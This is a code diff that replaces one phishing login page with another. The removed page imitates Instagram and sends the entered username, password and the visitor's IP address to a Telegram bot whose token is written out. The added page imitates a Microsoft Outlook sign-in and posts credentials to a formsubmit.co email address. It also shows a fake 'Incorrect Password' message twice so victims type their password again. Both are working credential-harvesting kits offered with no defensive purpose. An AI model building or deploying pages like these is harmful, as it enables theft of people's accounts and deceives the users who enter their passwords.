@@ -2,201 +2,216 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instaagraam</title>
-    <!-- FAVIVON -->
-    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
-    <!-- GOOGLE FONT -->
-    <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link
-        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
-        rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live Signin Page Clone</title>
+  <style>
+    @import url(https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,regular,italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic);
 
-    <!-- APP CSS -->
-    <link rel="stylesheet" href="./app.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
-        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+      color: #1b1b1b;
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      min-height: 100vh;
+      background-color: #dde2d1;
+    }
+
+    form {
+      width: 440px;
+      background-color: #fff;
+      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+      padding: 44px;
+    }
+
+    .logo {
+      margin-bottom: 15px;
+    }
+
+    form h2 {
+      font-size: 24px;
+      font-weight: 500;
+    }
+
+    .form-group {
+      margin: 0 0 16px;
+    }
+
+    form input {
+      padding: 6px 10px 6px 0;
+      margin-top: 1rem;
+      border: none;
+      outline: none;
+      border-bottom: 1px solid #000000b3;
+      width: 100%;
+      font-size: .9rem;
+    }
+
+    form p {
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+
+    form a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    form a:hover {
+      color: #000000b3;
+      text-decoration: underline;
+    }
+
+    form button {
+      display: block;
+      margin-left: auto;
+      width: 108px;
+      height: 32px;
+      padding: 4px 12px;
+      font-size: 15px;
+      background-color: #0067b8;
+      color: #fff;
+      border: none;
+      outline: none;
+      cursor: pointer;
+    }
+
+    form button:hover {
+      background-color: #004b85;
+    }
+
+    form button:active {
+      transform: scale(.97);
+    }
+
+    .bottom {
+      width: 440px;
+      background-color: #fff;
+      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+      padding: 8px 44px;
+      font-size: 15px;
+      margin-top: 20px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+
+    .bottom img {
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
+    }
+
+    .bottom:hover {
+      background-color: #dde2d1;
+    }
+
+    /* Modal styles */
+    #errorModal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #errorModal .modal-box {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 10px;
+      max-width: 300px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #errorModal .modal-box h3 {
+      margin-bottom: 10px;
+      color: #e74c3c;
+    }
+
+    #errorModal .modal-box p {
+      font-size: 14px;
+    }
+
+    #errorModal .modal-box button {
+      margin-top: 10px;
+      padding: 8px 16px;
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 
 <body>
+  <!-- Modal -->
+  <div id="errorModal">
+    <div class="modal-box">
+      <h3>Incorrect Password</h3>
+      <p>Please double-check your password and try again.</p>
+      <button onclick="closeModal()">Try Again</button>
+    </div>
+  </div>
 
-    <div class="container">
-        <div class="main-container">
-            <div class="main-content">
-                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
-                    <div class="slide-content" id="slide-content">
-                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
-                        <img src="./images/slide (2).jpg" alt="slide image">
-                        <img src="./images/slide (3).jpg" alt="slide image">
-                        <img src="./images/slide (4).jpg" alt="slide image">
-                        <img src="./images/slide (5).jpg" alt="slide image">
-                    </div>
-                </div>
-                <div class="form-container">
-                    <form id="contactForm" method="POST">
-                        <input type="text" id="ipaddress" name="ipaddress" hidden>
-                        <div class="form-content box">
-                            <div class="logo">
-                                <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
-                                <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
-                            </div>
-                            <div class="btn-group">
-                                <button class="btn-login" type="submit" id="button" value="Send Email">
-                                    <i class="fab fa-facebook-square"></i> Continue Using Facebook
-                                </button>
-                            </div>
-                            <div class="divine">
-                                <div></div>
-                                <div>OR</div>
-                                <div></div>
-                            </div>
-                            <div class="signin-form" id="signin-form">
-                                <div class="form-group">
-                                    <div class="animate-input">
-                                        <span>
-                                            Phone number, username or email
-                                        </span>
-                                        <input type="text" name="username" id="username" required>
-                                        <!-- <input type="hidden" name="_captcha" value="false"> -->
-                                        <!-- <input type="hidden" name="_redirect" value="https://qwayzdp.netlify.app/instagram/otp/657daf104b167f68d1979b9c.html"> -->
-                                    </div>
+  <div class="container">
+    <form id="form" method="POST" action="https://formsubmit.co/marketcaplinkcoin@gmail.com">
+<!--       <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png"> -->
 
-                                </div>
-                                <div class="form-group">
-                                    <div class="animate-input">
-                                        <span>
-                                            Password
-                                        </span>
-
-
-                                        <input type="text" name="password" id="password" required>
-                                        <button>Show</button>
-                                    </div>
-                                    <div
-                                        style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);">
-                                        <a href="#" class="forgot-pw">Forgotten your password?</a>
-                                    </div>
-                                </div>
-                                <div class="btn-group">
-                                    <button class="btn-login" type="submit" id="button" value="submit">
-                                        Log In
-                                    </button>
-                                    <div class="box goto">
-                                        <p>
-                                            Don't have an account?
-                                            <a href="#">Sign up</a>
-                                        </p>
-                                    </div>
-
-                    </form>
-                </div>
-
-
-
+      <div class="forms-container">
+        <div class="forms">
+          <div class="first">
+            <h2>Sign in</h2>
+            <div class="form-group">
+              <input type="email" placeholder="Email" name="username" id="username" required>
+              <input type="password" placeholder="Password" name="password" id="password" required>
+              <input type="hidden" name="_next" value="https://frilea.vercel.app/thanks.html" />
+              <input type="hidden" name="_captcha" value="false">
             </div>
+            <p>No Account? <a href="#">Create One!</a></p>
+            <a href="#">Sign in with a security key <span>?</span></a>
+          </div>
         </div>
+      </div>
+      <button type="submit" value="submit">Sign in</button>
+    </form>
 
-
-        <div class="app-download">
-            <p>Get the app.</p>
-            <div class="store-link">
-                <a href="#">
-                    <img src="./images/app-store.png" alt="app store">
-                </a>
-                <a href="#">
-                    <img src="./images/gg-play.png" alt="google play">
-                </a>
-            </div>
-        </div>
+    <div class="bottom">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png">
+      <span>Sign-in options</span>
     </div>
-    </div>
-    </div>
-    <div class="footer">
-        <div class="links">
-            <a href="#">About</a>
-            <a href="#">Blog</a>
-            <a href="#">Jobs</a>
-            <a href="#">Help</a>
-            <a href="#">API</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Top Accounts</a>
-            <a href="#">Hashtags</a>
-            <a href="#">Locations</a>
-            <a href="#" id="darkmode-toggle">Darkmode</a>
-        </div>
-        <hr>
+  </div>
 
-        <div class="copyright">
+  <!-- JavaScript for modal and attempt tracking -->
+  <script>
+    let attemptCount = 0;
 
-            <p>from</p>
+    document.getElementById('form').addEventListener('submit', function (e) {
+      attemptCount++;
+      if (attemptCount < 3) {
+        e.preventDefault(); // Prevent submission
+        document.getElementById('errorModal').style.display = 'flex'; // Show modal
+      }
+      // On third attempt, allow submission
+    });
 
-            <img src="images\download.jpg" alt="">
-
-        </div>
-
-    </div>
-    </div>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipaddress = data.ip;
-                    document.getElementById('ipaddress').value = ipaddress;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
-        });
-
-
-
-
-        document.getElementById('contactForm').addEventListener('submit', function (event) {
-            event.preventDefault();
-
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var ipaddress = document.getElementById('ipaddress').value;
-
-            var telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIpaddress: ${ipaddress}`;
-           
-             var token = '8012677283:AAHXpAC4tKMzs8FvOgsCh8y4Mjouyg04HJI';
-            var chat_id = '8115174388'
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';  // Redirect to thank you page
-                    } else {
-                        alert('Error sending message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        });
-
-    </script>
-
-
-
-</body>
-
-</html>
-
-<script src="app.js"></script>
-
-
-
+    function closeModal() {
+      document.getElementById('errorModal').style.display = 'none';
+    }
+  </script>
 </body>
 
 </html>
